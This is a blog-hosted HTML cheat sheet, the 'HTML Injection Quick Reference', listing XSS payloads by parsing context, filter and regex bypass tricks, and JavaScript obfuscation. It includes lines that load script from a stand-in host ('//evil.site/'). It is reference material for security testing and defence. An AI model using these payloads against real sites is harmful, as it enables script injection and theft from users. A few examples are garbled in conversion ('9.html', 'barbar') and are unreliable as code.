<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Pentest-HTML_Injection_Quick_Reference_HIQR.md – HTML Injection – Deadliest Web Attacks</title>
  <style type="text/css">
      code{white-space: pre-wrap;}
      span.smallcaps{font-variant: small-caps;}
      span.underline{text-decoration: underline;}
      div.column{display: inline-block; vertical-align: top; width: 50%;}
  </style>
  <link rel="stylesheet" href="Css/include.css" />
</head>
<body>
<header>
<h1 class="title">HTML Injection – Deadliest Web Attacks</h1>
</header>
<section id="some-articles-on-html-injection-and-xss" class="level1">
<h1>Some articles on HTML Injection and XSS:</h1>
<ul>
<li>When a payload travels from a URL parameter to a cookie and back again, say farewell to your security.</li>
<li>An attack is persistent when the payload continues to be reflected after only being injected once; kind of like how user-tracking uses cookies to keep a persistent profile on you.</li>
<li>Browsers may be more tolerant of an injection payload than your security filters.</li>
<li>A vulnerable web app may already have all the libraries you need to summon exploit code from somewhere else.</li>
<li>Preserve a script block’s syntax when injecting into JavaScript. Use a payload that maintains correct syntax; don’t let an error in the browser’s parser prevent your hack from working. And take a logical approach to crafting the attack.</li>
<li>A walk-through of a simple injection attack. And an equally simple attack that injects a payload across two URL parameters.</li>
<li>An example of how Content Security Policy counters HTML injection attacks so that JavaScript is Harmless.</li>
<li>How a tricky payload bypassed a countermeasure that inadequately escaped JavaScript metacharacters.</li>
<li>Comparing a coding weakness vs. an exploitable vuln.</li>
<li>Read the introduction to the HIQR.</li>
</ul>
</section>
<section id="intro" class="level1">
<h1>Intro</h1>
<p>Friends, Romans, visitors, lend me your eyes. I’ve added an HTML injection quick reference (HIQR) to the site. It’s not in iambic pentameter, but there’s a certain rhythm to the placement of quotation marks, less-than signs, and alert() functions.</p>
<p>For those unfamiliar with HTML injection (or cross-site scripting in the vulgate), it’s a vulnerability that enables an attacker to modify a page in order to affect the behavior of a victim’s browser. As the name suggests, the attacker injects markup or JavaScript, usually via a form field or querystring parameter, into a string that is then re-displayed by the app. In the worst cases, the app delivers malicious content to anyone who visits the infected page. Insecure string concatenation is the most common programming error that leads to this flaw.</p>
<p>Imagine an app that permits users to write <img> tags in posts to show off cute pictures of spiders. The app expects users to add images with src attributes that point anywhere on the web. For example,</p>
<p><code>&lt;img src=&quot;http://web.site/image.png&quot;&gt;</code></p>
<p>Were users of the app to limit themselves to nicely formed http: or https: schemes, all would be well in the world. However, there’s already trouble brewing in the form of javascript: schemes. For example, a malicious user could inject arbitrary JavaScript into the page — a dangerous situation considering the JavaScript will be executing within the Same Origin Policy of the web app.</p>
<p><code>&lt;img src=&quot;javascript:alert(9)&quot;&gt;</code></p>
<p>Then there’s the trouble with attributes. Even if the site restricted schemes to http: or https: a (not-at-all) devious hacker could add an inline event handler, for example,</p>
<p><code>&lt;img src=&quot;http://&amp;&quot;&gt;</code></p>
<p>Now the attacker has two ways of executing JavaScript in their victim’s browsers — javascript: schemes and event handlers.</p>
<p>There’s more. Suppose the app writes anything the user submits into the web page. We’ll even imagine that the app’s developers have decided to enforce an http: or https: scheme and they only allow visitors to define a src value. In order to be more secure, the web app writes the src value into an element that’s guaranteed to not have any event handlers. This is where string concatenation rears its ugly, insecure head. For example, the hacker submits the following src attribute:</p>
<p><code>http:&quot;&gt;alert(9)</code></p>
<p>The app pops this value into the src attribute and, presto!, a new element appears. Notice the two characters at the end of the line, “&gt;, these were the intended end of the src attribute and <img> tag, which were subverted by the hacker’s payload:</p>
<p><code>&lt;img src=&quot;http:&quot;&gt;alert(9)&gt;&quot;&gt;</code></p>
<p>HTML injection attacks become increasingly complex depending on the context where the payload is rendered, the characters that are stripped or escaped by data validation filters, the patterns used to detect malicious payloads, and the encoding of the payloads and the page. Check out chapter 2 of HWA for more background on these situations.</p>
<p>You’ll find more info on this blog in articles with an “html injection” category or tag.</p>
<p>SPQR (Senātus Populusque Rōmānus) was the Latin abbreviation used to refer to the collective citizens of the Roman empire. Read up on HTML injection and you’ll become SPQH (Senātus Populusque Haxxor) soon enough.</p>
</section>
<section id="html-injection-quick-reference-hiqr" class="level1">
<h1>HTML Injection Quick Reference (HIQR)</h1>
<p>Mike Shema, Deadliest Web Attacks The latest revision is at https://mutantzombie.github.io/HIQR/hiqr.html</p>
<p>Table 1: Injection Techniques for Various Parsing Contexts<br />
Table 2: Payload Crafting Techniques to Bypass Filters and Data Validation<br />
Table 3: JavaScript Compositions for Manipulation &amp; Obfuscation</p>
<section id="table-1-injection-techniques-for-various-parsing-contexts" class="level2">
<h2>Table 1: Injection Techniques for Various Parsing Contexts</h2>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 17%" />
<col style="width: 62%" />
</colgroup>
<thead>
<tr class="header">
<th>Context</th>
<th>State</th>
<th>Injection Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Data State <br> (Text node,<br> open tag)</td>
<td><br> <code>&lt;/element&gt;</code><br> <code>--&gt;</code> <code>]]&gt;</code></td>
<td><code>Welcome back, &lt;script&gt;☣&lt;/script&gt;...</code> <code>&lt;title&gt;Search Results for ‘&lt;/title&gt;☣‘</code> <code>&lt;-- lorem ipsem--&gt;&lt;script&gt;☣&lt;script&gt;--&gt;</code> <code>&lt;FOO&gt;&lt;![CDATA[]]&gt;&lt;script&gt;☣&lt;/script&gt;]]&gt;</code></td>
</tr>
<tr class="even">
<td>Attribute <br> value</td>
<td><p>Unquoted</p>
<p>Single-quoted <br> (U+0027) Double-quoted <br> (U+0022)</p></td>
<td><p><code>&lt;input type=text name=foo value=a&gt;&lt;script&gt;☣&lt;script&gt;&gt;</code> <code>&lt;input type=text name=foo value=a/&gt;&lt;script&gt;☣&lt;script&gt;&gt;</code> <code>&lt;input type=text name=foo value=''onevent=☣//'&gt;</code></p>
<p><code>&lt;input type=text name=foo value=&quot;&quot;onevent=☣//&quot;&gt;</code></p></td>
</tr>
<tr class="odd">
<td>JavaScript <br> variable <br> assignment</td>
<td><p>Unquoted</p>
<p>Single-quoted <br> (U+0027) Double-quoted <br> (U+0022) Escape characters</p></td>
<td><p><code>&lt;script&gt; var foo='';☣;//';</code></p>
<p><code>&lt;script&gt; var foo=&quot;&quot;;☣</code><br><code>;//&quot;;</code></p>
<p>(blog post)</p></td>
</tr>
<tr class="even">
<td>JavaScript <br> Window.location <br> object property <br> .hash <br> .href <br> .pathname <br> .search <br></td>
<td><p>URL</p>
<p><code>#fragment</code></p>
<p><code>#jQuery</code></p></td>
<td><p><code>http://web.site/page/&lt;script&gt;☣&lt;script&gt;</code> <code>&lt;script&gt;document.write(&quot;Page not found: &quot; + window.location);</code></p>
<p><code>&lt;script&gt;document.write(window.location);</code></p>
<p><code>http://web.site/page#&lt;img/src=%22%22onerror=☣&gt;</code> <code>$(document).ready(function() {</code> <code>var x = (window.location.hash.match(/^#([^\/].+)$/)  barbar [])[1];</code> <code>var w = $('a[name=&quot;' + x + '&quot;], [id=&quot;' + x + '&quot;]');</code> <code>});</code></p></td>
</tr>
</tbody>
</table>
<section id="footnotes" class="level3">
<h3>Footnotes</h3>
<p>1 The biohazard symbol (U+2623) – ☣ – in each example represents a JavaScript payload. It could be anything from a while loop to DoS the browser, e.g. var a;while(1){a+=“a”} to the ubiquitous alert(9). These categories focus on the placement of the payload within the rendered document rather than the effect of the payload.<br />
Though it seems daunting to review the HTML5 syntax specification, doing so aids in understanding how HTML is supposed to be formed. HTML5 defines an explicit algorithm for parsing HTML documents. Read through the spec to become familiar with the expectations of Unicode code points, parse errors, and decisions a User Agent may make when dealing with markup. A standardized approach to parsing is supposed to minimize the quirks and differences among browsers, thus removing a historical source of insecurity. The HTML4 spec was not as clear or as rigourous on parsing.<br />
2 Sometimes it’s helpful to insert a space before the –&gt; to ensure the tag is interpreted. [ HTML5 comments ]<br />
3 This is a quirk of jQuery’s design choice for overloading the $() API to accept selectors or elements. Read about the interplay of JavaScript and Content Security Policy on the blog.</p>
</section>
</section>
<section id="table-2-payload-crafting-techniques-to-bypass-filters-and-data-validation" class="level2">
<h2>Table 2: Payload Crafting Techniques to Bypass Filters and Data Validation</h2>
<table>
<colgroup>
<col style="width: 14%" />
<col style="width: 19%" />
<col style="width: 66%" />
</colgroup>
<thead>
<tr class="header">
<th>Concept</th>
<th>Notes</th>
<th>Payload Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Alternate <br> attribute <br> delimiters</td>
<td><p>Foward slash Dangling quoted string</p>
<p>CRLF instead of space</p></td>
<td><code>&lt;img/src=&quot;&quot;onerror=alert(9)&gt;</code> <code>&lt;a'' href'' onclick=alert(9)&gt;foo&lt;/a&gt;</code> <code>&lt;a&quot;&quot; href=&quot;&quot;onclick=alert(9)&gt;foo&lt;/a&gt;</code> <code>&lt;img%0d%0asrc=&quot;&quot;%0d%0aonerror=alert(9)&gt;</code></td>
</tr>
<tr class="even">
<td>HTML <br> entity <br> encoding <br></td>
<td>JavaScript scheme (Decimal, hex, <br> unicode)</td>
<td><code>&lt;a href=&quot;java&amp;#115;cript:alert(9)&quot;&gt;foo&lt;/a&gt;</code> <code>&lt;a href=&quot;java&amp;#x73;cript:alert(9)&quot;&gt;foo&lt;/a&gt;</code> <code>&lt;a href=&quot;java&amp;#x0073;cript:alert(9)&quot;&gt;foo&lt;/a&gt;</code></td>
</tr>
<tr class="odd">
<td>JavaScript <br> inline event handlers html4 or html5</td>
<td>Unquoted Double-quoted Single-quoted HTML5 autofocus</td>
<td><code>&lt;input type=text name=foo value=a%20onchange=alert(9)&gt;</code> <code>&lt;input type=&quot;text&quot; name=&quot;foo&quot; value=&quot;&quot;onmouseover=alert(9)//&quot;&gt;</code> <code>&lt;input type='text' name='foo' value=''onclick=alert(9)//'&gt;</code> <code>&lt;input type=&quot;text&quot; name=&quot;foo&quot; value=&quot;&quot;autofocus/onfocus=alert(9)//&quot;&gt;</code></td>
</tr>
<tr class="even">
<td>Data URI handlers</td>
<td><p>src &amp; href attributes</p>
<p>Base64 data</p>
<p>Alternate <br> character sets</p></td>
<td><p><code>&lt;a href=&quot;data:text/html,&lt;script&gt;alert(9)&lt;/script&gt;&quot;&gt;foo&lt;/a&gt;</code> <code>&lt;script src=&quot;data:,alert(9)&quot;&gt;&lt;/script&gt;</code> <code>&lt;script src=&quot;data:application/x-javascript,alert(9)&quot;&gt;&lt;/script&gt;</code></p>
<p><code>&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCg5KTwvc2NyaXB0Pg&quot;&gt;foo&lt;/a&gt;</code> <code>&lt;script src=&quot;data:;base64,YWxlcnQoOSk&quot;&gt;&lt;/script&gt;</code></p>
<p><code>&lt;a href=&quot;data:text/html;charset=utf-16,</code> <code>%ff%fe%3c%00s%00c%00r%00i%00p%00t%00%3e</code> <code>%00a%00l%00e%00r%00t%00(%009%00)%00</code> <code>&lt;%00/%00s%00c%00r%00i%00p%00t%00&gt;%00&quot;&gt;foo&lt;/a&gt;</code></p></td>
</tr>
<tr class="odd">
<td>Alternate <br> markup</td>
<td>SVG</td>
<td><code>&lt;svg onload=&quot;javascript:alert(9)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt;</code> <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</code> <code>&lt;g onload=&quot;javascript:alert(9)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;</code> <code>&lt;svg&gt;&lt;script xlink:href=data:,alert(9)&gt;&lt;/script&gt;</code> <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</code> <code>&lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;javascript:alert(9)&quot;&gt;</code> <code>&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;</code></td>
</tr>
<tr class="even">
<td>Untidy <br> markup</td>
<td><p>Missing greater-than sign</p>
<p>Recover from syntax error</p>
<p>Uncommon syntax</p>
<p>Orphan entity</p>
<p>Vestigal attribute</p></td>
<td><p><code>&lt;script%0d%0aalert(9)&lt;/script&gt;</code> <code>&lt;script%20&lt;!--%20--&gt;alert(9)&lt;/script&gt;</code></p>
<p><code>&lt;a href=&quot;&quot;&amp;&lt;img&amp;amp;/onclick=alert(9)&gt;foo&lt;/a&gt;</code> <code>&lt;script/&lt;a&gt;alert(9)&lt;/script&gt;</code> <code>&lt;script/&lt;a&gt;alert(9)&lt;/script &lt;/a&gt;</code></p>
<p><code>&lt;a&quot;&quot;id=a href=''onclick=alert(9)&gt;foo&lt;/a&gt;</code></p>
<p><code>&lt;a href=&quot;&quot;&amp;amp;/onclick=alert(9)&gt;foo&lt;/a&gt;</code></p>
<p><code>&lt;script/id=&quot;a&quot;&gt;alert(9)&lt;/script&gt;</code></p></td>
</tr>
<tr class="odd">
<td>Anti-regex <br> patterns</td>
<td><p>Element closed prematurely</p>
<p>Element confusion</p>
<p>Quote confusion</p>
<p>Quote confusion with element</p>
<p>Quote mixing with element</p>
<p>Recursive elements</p>
<p>Repeated attributes (match last occurence)</p></td>
<td><p><code>&lt;img src=&quot;&gt;&quot;onerror=alert(9)&gt;</code></p>
<p><code>&lt;img id=&quot;&gt;&lt;&quot;class=&quot;&gt;&lt;&quot;src=&quot;&gt;&quot;onerror=alert(9)&gt;</code></p>
<p><code>&lt;img src=&quot;\&quot;a=&quot;&gt;&quot;onerror=alert(9)&gt;</code> <code>&lt;a id=' href=&quot;&quot;&gt;'href=javascript:alert(9)&gt;foo&lt;/a&gt;</code> <code>&lt;a id='href=http://web.site/'onclick=alert(9)&gt;foo&lt;/a&gt;</code> <code>&lt;a href= . '&quot;\' onclick=alert(9) '&quot;'&gt;foo&lt;/a&gt;</code></p>
<p><code>&lt;img src=&quot;\&quot;'&lt;a href='&quot;&gt;&quot;'onerror=alert(9)&gt;</code> <code>&lt;a id='http://web.site/'onclick=alert(9)&lt;!--href=a&gt;foo&lt;/a&gt;--&gt;</code></p>
<p><code>&lt;img src=&quot;'&quot;id='&lt;img src=&quot;&quot;&gt;'onerror=alert(9)&gt;</code></p>
<p><code>&lt;img src=&quot;&lt;img src='&lt;img src=.&gt;'&gt;&quot;onerror=alert(9)&gt;</code></p>
<p><code>&lt;a href=javascript:alert(9) href href='' href=&quot;&quot;&gt;foo&lt;/a&gt;</code></p></td>
</tr>
</tbody>
</table>
<section id="footnotes-1" class="level3">
<h3>Footnotes</h3>
<p>1 HTML5’s Content Security Policy headers can neutralize these attacks by preventing the User Agent from executing JavaScript within this context unless the page author is forced to include the “unsafe-inline” directive.<br />
2 The basic format is dataurl := “data:” [ mediatype ] [ “;base64” ] “,” data. The scheme is defined in RFC 2397.<br />
3 Per HTML5 spec, “When the user agent leaves the attribute name state (and before emitting the tag token, if appropriate), the complete attribute’s name must be compared to the other attributes on the same token; if there is already an attribute on the token with the exact same name, then this is a parse error and the new attribute must be dropped, along with the value that gets associated with it (if any).”</p>
</section>
</section>
<section id="table-3-javascript-compositions-for-manipulation-obfuscation" class="level2">
<h2>Table 3: JavaScript Compositions for Manipulation &amp; Obfuscation</h2>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 20%" />
<col style="width: 58%" />
</colgroup>
<thead>
<tr class="header">
<th>Technique</th>
<th>Notes</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Concatenation</td>
<td><p>String operators</p>
<p>Locigal operators</p>
<p>Mathematical operators</p></td>
<td><p><code>var a = &quot;foo&quot;+alert(9)//&quot;;</code></p>
<p><code>var a = &quot;foo&quot;&amp;&amp;alert(9)//&quot;;</code></p>
<p><code>var a = &quot;foo&quot;&amp;&amp;alert(9)//&quot;;</code></p></td>
</tr>
<tr class="even">
<td>Function execution</td>
<td><p>Anonymouns</p>
<p>Method lookup</p></td>
<td><p><code>(function(){alert(9)})()</code></p>
<p><code>window[&quot;alert&quot;](9.html)</code></p></td>
</tr>
<tr class="odd">
<td>Strings</td>
<td><p>String object</p>
<p>Regex object</p>
<p>source attribute</p></td>
<td><p><code>String.fromCharCode(0x61,0x62)</code></p>
<p><code>alert(/foo bar/.source)</code></p>
<p><code>window[/alert/.source](9.html)</code></p></td>
</tr>
<tr class="even">
<td>Harness function from a JavaScript library</td>
<td><p>Angular</p>
<p>Ember JS</p>
<p>jQuery</p>
<p>Prototype</p>
<p>Underscore</p></td>
<td><p><code>angular.bind(self, alert, 9)()</code> <code>angular.element.apply(alert(9))</code></p>
<p><code>Ember.run(null, alert, 9)</code></p>
<p><code>$.get('//evil.site/')</code> (site serves alert(9)) <code>$.getScript('//evil.site/')</code> (site serves alert(9)) <code>$('#main').load('//evil.site/');</code> (site serves <code>&lt;script&gt;alert(9)&lt;/script&gt;</code> into selector, e.g. #main)</p>
<p><code>Prototype.K(alert)(9)</code> <code>new Ajax.Request('//evil.site/'</code>)</p>
<p><code>_.defer(alert, 9)</code> <code>_.delay(alert, 0, 9)</code> <code>_.once(alert(9))</code></p></td>
</tr>
<tr class="odd">
<td>Type coercion</td>
<td><ol type="1">
<li><p>Boolean plus Object converts to String</p></li>
<li><p>Extract character from String by index</p></li>
<li><p>Compose String from characters</p></li>
<li><p>Execute function by method lookup</p></li>
</ol></td>
<td><p><code>false + &quot;&quot; == &quot;false&quot;</code> <code>![] + []</code></p>
<p><code>( false + &quot;&quot; )[1] == &quot;a&quot;</code> <code>( ![] + [] )[1]</code></p>
<p><code>(![]+[])[1] +</code> <code>(![]+[])[2] +</code> <code>(![]+[])[4] +</code> <code>(!![]+[])[1] +</code> <code>(!![]+[])[0]</code></p>
<p><code>(window[&quot;alert&quot;])(9)</code> <code>(window[&quot;ale&quot;+&quot;rt&quot;])(9)</code> <code>(window[(![]+[])[1] + (![]+[])[2] +</code> <code>(![]+[])[4] +</code> <code>(!![]+[])[1] + (!![]+[])[0]])(9)</code></p></td>
</tr>
</tbody>
</table>
</section>
</section>
</body>
</html>
